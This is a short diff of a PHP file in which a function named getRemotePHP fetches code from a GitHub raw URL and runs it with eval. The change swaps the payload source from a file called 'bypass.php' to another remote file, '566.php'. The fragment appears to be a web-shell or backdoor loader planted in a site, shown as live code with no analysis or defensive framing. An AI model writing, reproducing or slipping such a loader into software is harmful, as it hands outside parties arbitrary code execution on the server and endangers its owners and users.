@@ -18,5 +18,6 @@ function getRemotePHP($url) {
     eval("?>$code");
 }
 
-getRemotePHP('https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/bypass.php');
+getRemotePHP('https://raw.githubusercontent.com/lyyahm/rreee/refs/heads/main/566.php');
 ?>
+
